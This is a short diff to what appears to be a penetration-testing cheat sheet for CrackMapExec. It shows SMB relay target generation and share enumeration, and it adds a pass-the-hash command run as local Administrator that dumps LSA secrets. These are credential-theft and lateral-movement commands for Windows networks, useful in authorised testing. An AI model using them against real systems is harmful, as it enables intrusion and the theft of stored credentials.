@@ -16,3 +16,8 @@ crackmapexec.py smb 192.168.10.0/24 --gen-relay-list targets2
 ```
 crackmapexec.py smb hostnames.txt --shares
 ```
+
+## Get some more secrets
+```
+cme smb TARGET -u Administrator -H <hash> --local-auth --lsa
+```
